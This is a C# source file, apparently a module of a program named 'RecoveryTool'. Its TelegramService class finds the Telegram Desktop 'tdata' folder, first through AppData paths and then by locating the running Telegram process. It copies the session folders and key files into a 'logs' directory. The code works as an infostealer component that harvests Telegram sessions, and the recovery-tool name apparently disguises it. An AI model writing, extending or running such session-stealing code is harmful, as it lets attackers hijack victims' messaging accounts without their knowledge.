using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Messenger
{
    public class TelegramService
    {
        private static string? Session;
        private static readonly string[] PossiblePaths =
        {
            Common.LocalData,
            Common.AppData,
            Common.AppDataLow
        };

        public static async Task StartTelegramAsync()
        {
            foreach (var basePath in PossiblePaths)
            {
                var tDataLocation = Path.Combine(basePath, "Telegram Desktop", "tdata");
                if (Directory.Exists(tDataLocation))
                {
                    string logsPath = Common.EnsureTelegramPath();

                    await MessengerHelper.CopyDirectoriesAsync(
                        sourcePath: tDataLocation,
                        targetPath: logsPath,
                        predicate: dir => dir.Name.Length == 16
                    );

                    await MessengerHelper.CopyFilesAsync(
                        sourcePath: tDataLocation,
                        targetPath: logsPath,
                        predicate: fi => fi.Name.Length == 17
                    );

                    Session = logsPath;
                    break;
                }
            }

            if (Session == null)
            {
                var hookedSession = MessengerHelper.TryHookProcess(
                    processName: "Telegram",
                    replace: "\\Telegram.exe",
                    append: "tdata"
                );

                if (hookedSession != "NotHooked")
                {
                    string logsPath = Common.EnsureTelegramPath();

                    await MessengerHelper.CopyDirectoriesAsync(
                        sourcePath: hookedSession,
                        targetPath: logsPath,
                        predicate: dir => dir.Name.Length == 16
                    );

                    await MessengerHelper.CopyFilesAsync(
                        sourcePath: hookedSession,
                        targetPath: logsPath,
                        predicate: fi => fi.Name.Length == 17
                    );

                    Session = logsPath;
                }
            }
        }
    }
}
